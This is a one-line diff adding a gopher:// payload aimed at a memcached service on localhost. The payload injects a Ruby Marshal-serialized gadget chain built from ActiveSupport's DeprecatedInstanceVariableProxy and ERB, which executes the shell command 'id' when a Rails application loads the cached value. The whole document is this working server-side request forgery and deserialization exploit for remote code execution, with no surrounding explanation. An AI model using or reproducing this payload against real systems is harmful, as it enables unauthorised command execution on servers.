@@ -1,0 +1,1 @@
+gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%2060%20196%0d%0a%04%08o:%40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy%09:%0E%40instanceo:%08ERB%06:%09%40srcI%22%0C%25x%28id%29%3B%06:%06ET:%0C%40method:%0Bresult:%09%40varI%22%0C%40result%06%3B%09T:%10%40deprecatoro:%1FActiveSupport::Deprecation%06:%0E%40silencedT%0d%0a
